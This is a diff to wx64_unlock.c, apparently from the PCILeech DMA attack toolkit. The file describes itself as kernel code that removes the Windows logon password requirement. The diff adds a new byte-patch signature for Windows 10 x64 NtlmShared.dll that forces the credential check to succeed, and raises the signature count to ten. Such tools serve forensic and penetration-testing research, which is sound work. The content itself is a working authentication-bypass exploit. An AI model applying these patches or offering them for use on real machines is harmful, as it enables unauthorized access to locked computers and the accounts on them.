@@ -1,6 +1,6 @@
 // wx64_unlock.c : kernel code to remove the password requirement when logging on to Windows.
 //
-// (c) Ulf Frisk, 2016
+// (c) Ulf Frisk, 2016-2020
 // Author: Ulf Frisk, pcileech@frizk.net
 //
 // compile with (normal mode):
@@ -129,7 +129,7 @@ NTSTATUS Unlock_FindAndPatch(_In_ PKERNEL_FUNCTIONS2 fnk2, _Inout_ PBYTE pbPages
 	return E_FAIL;
 }
 
-#define NUMBER_OF_SIGNATURES 9
+#define NUMBER_OF_SIGNATURES 10
 NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 {
 	SIGNATURE oSigs[NUMBER_OF_SIGNATURES] = {
@@ -177,7 +177,12 @@ NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
             { .cbOffset = 0x695,.cb = 4,.pb = { 0xff, 0x15, 0x55, 0x1c } },
             { .cbOffset = 0x69e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
             { .cbOffset = 0x69e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
-        }
+        },
+		{.chunk = { // win10x64 NtlmShared.dll (2019-10-06::10.0.18362.418)
+			{.cbOffset = 0x741,.cb = 6,.pb = { 0x32, 0xC0, 0xE9, 0x04, 0xFB, 0xFF } },
+			{.cbOffset = 0x741,.cb = 6,.pb = { 0x32, 0xC0, 0xE9, 0x04, 0xFB, 0xFF } },
+			{.cbOffset = 0x741,.cb = 2,.pb = { 0xb0, 0x01 } } }
+		}
 	};
 	KERNEL_FUNCTIONS2 fnk2;
 	PPHYSICAL_MEMORY_RANGE pMemMap, pMM;
